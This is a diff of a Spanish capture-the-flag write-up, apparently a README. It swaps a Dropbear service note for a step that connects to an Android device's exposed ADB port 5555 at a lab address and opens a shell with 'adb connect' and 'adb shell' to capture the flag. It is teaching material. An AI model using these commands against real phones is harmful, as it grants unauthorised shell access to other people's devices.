@@ -38,6 +38,20 @@ Servidor web (puerto **8080**): `http://192.168.25.139:8080`
 
 ![5](https://user-images.githubusercontent.com/75953873/179634788-bc82e682-c166-43c9-bd67-366001b12fd5.png)
 
-Servicio vulnerable (puerto **22000**): `Dropbear`
-
 O.S: `Android` **--> Kernel Linux**
+
+Puerto **5555**: Es un puerto utilizado por ADB (Puente de Depuración de Android) que se utiliza para conectarse a telefonos móviles y ejecutar comandos.
+
+- *Paso 4:* Conectarse al telefono vía ADB y capturar la flag.
+
+Descargar ADB:
+```
+apt-get install -y adb
+```
+
+Conectarse con el dispositivo y obtener una shell:
+```
+adb connect 192.168.25.139:5555
+adb shell
+```
+![6](https://user-images.githubusercontent.com/75953873/179636318-eb4f31c6-3c25-4881-aec8-802eb3052785.png)
